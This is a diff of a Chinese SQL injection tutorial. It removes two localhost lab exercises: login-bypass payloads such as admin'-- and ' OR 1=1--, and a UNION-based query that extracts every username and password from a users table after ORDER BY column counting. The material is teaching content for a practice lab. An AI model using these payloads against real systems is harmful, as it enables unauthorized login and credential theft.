@@ -26,58 +26,6 @@ SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='xxx'
                                     └──────────────┘            └─ 后面的被注释掉
                                     永真条件！返回第一行数据
 ```
-
-## 🎯 靶场练习 1：登录绕过
-
-你的任务：**不用密码，以 admin 身份登录**
-
-打开 `http://127.0.0.1:5000/sqli/login`
-
-### 尝试这些 Payload：
-
-```sql
-admin'--
-' OR 1=1--
-admin' OR '1'='1
-' OR '1'='1' --
-" OR 1=1--
-') OR 1=1--
-```
-
-### 原理：注释掉密码验证部分
-
-```sql
--- 原本
-SELECT * FROM users WHERE username='admin' AND password='123456'
-
--- 注入后（-- 是 SQL 注释）
-SELECT * FROM users WHERE username='admin'--' AND password='123456'
-                                              └── 这部分变成注释，不执行！
-```
-
-## 🎯 靶场练习 2：UNION 联合查询窃取数据
-
-你的任务：**获取 users 表的所有用户名和密码**
-
-打开 `http://127.0.0.1:5000/sqli/search`
-
-### 步骤 1：判断列数
-
-```sql
-' ORDER BY 1--    (正常)
-' ORDER BY 2--    (正常)
-' ORDER BY 3--    (正常)
-' ORDER BY 4--    (报错！→ 说明有 3 列)
-```
-
-### 步骤 2：UNION 注入
-
-```sql
-' UNION SELECT 1, username, password FROM users--
-```
-
-结果：搜索结果 + 所有用户的密码！
-
 ## 🗂️ SQL 注入分类
 
 | 类型 | 说明 |
